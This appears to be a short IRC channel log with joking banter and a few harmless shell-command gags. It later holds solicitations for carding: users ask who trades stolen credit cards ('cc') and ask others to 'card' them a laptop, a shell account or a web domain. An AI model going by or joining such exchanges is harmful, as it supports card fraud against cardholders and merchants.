+:J4n3 :<|S4n4m|> jab sey tum sey bat ki hay
+
+since the time i've started talking to you
+
+:J4n3 :aaaaahhhhhhhhhh
+:D1ck :hhaha
+:D1ck ::P
+:D1ck :mv logs.txt bhabi.txt
+
+(Note:: bhabi = sister-in-law)
+
+:J4n3 :lol
+:J4n3 :oye
+:D1ck :<bhab> cat bhabi.txt
+:D1ck :<bhabi> I WILL KILL U D4v3
+:D1ck :?
+:J4n3 :muhahahahahhahahahahhhaa
+:J4n3 :HHAHAHAHAHAHAH
+:D1ck ::)
+:J4n3 :heheheheh
+:J4n3 :ROFLMAO
+:D1ck :(:
+:J4n3 :ROFLMAO
+:D1ck :=P
+:m4r1n4ru :Away
+:dmonchild :ACTION i am selling hardware if your intrested please /msg me for prices thanks
+:m4r1n4ru :Away
+:Dariox :who trade cc
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:[Agent] :anyone can card me a laptop?
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:telnet- :anyone can card me a shell or web domain....pls answer to me
+:m4r1n4ru :Away
+:[Agent] :wanna trade
